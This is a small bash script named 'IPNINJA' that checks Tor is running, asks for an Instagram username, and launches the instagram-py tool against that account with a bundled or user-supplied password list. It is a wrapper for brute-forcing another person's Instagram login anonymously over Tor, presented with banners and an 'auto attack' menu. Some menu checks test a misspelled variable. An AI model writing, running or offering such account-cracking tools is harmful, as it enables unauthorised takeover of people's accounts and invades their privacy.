#!/usr/bin/bash
#Author prince kumar
#Date 24 oct 2021
#Make a function to show the maue option...
#Trap the exit 
trap out SIGINT
trap out SIGTSTP
# Make a function To user exit
#Small banner to show 
banner(){
	clear
	echo -e "\e[36;1m"
	echo '  ___             ___  
               (o o)           (o o) 
              (  V  ) IPNINJA (  V  )
            . --m-m-------------m-m--'
	}

out(){
	echo ""
	echo -e "\e[31;1m Exiting 🧐 "
	echo -e "\e[32;1m   __________________  
((                  ))
 )) MADE BY PRINCE (( 
((                  ))
  ------------------  "
	sleep 2
	exit 1
}
#Check if tor is running or not...
pgrep -x tor > /dev/null 2>&1
if [[ $? -eq 0 ]];then
	echo -e "\e[37;1m Tor is running.."
else
	echo -e "\e[37;1m Tor is not running, Please open new session and after starting tor run inpumch agaun"
	exit 1
fi

#Ask the insta username..
echo -ne "\e[36;1m Enter the username: "
read inuser
echo " "
echo -e "\e[31;1m[01]\e[32;1m Auto attack"
echo -e "\e[31;1m[02]\e[32;1m Menual attack"
echo -e "\e[31;1m[03]\e[32;1m About Me"
echo -e "\e[31;1m[04]\e[32;1m Exit "
echo -ne ":: "
read a_optn
if [[ $a_aptn -eq "1" || $a_optn -eq "01" ]];then
	echo "Auto attck.."
	banner
	instagram-py -u $inuser -pl Autopass.txt
	
elif [[ $a_aptn -eq "2" || $a_optn -eq "02" ]];then
	echo -ne  "\e[35;1mPath to password  list: "
	read p_path
	banner
	instagram-py -u $inuser -pl $p_path
elif [[ $a_aptn -eq "3" || $a_optn -eq "03" ]];then
	echo -e "\e[36;1m hi i am prince kumar . i am a junior mechanical engineer"
	echo -e "\e[36;1m Youtube : shorturl.at/qsJKN"
elif [[ $a_aptn -eq "4" || $a_optn -eq "04" ]];then
    out 
else 
	echo "Invalid option [ kiya hacker banegaa re tuu] "
fi
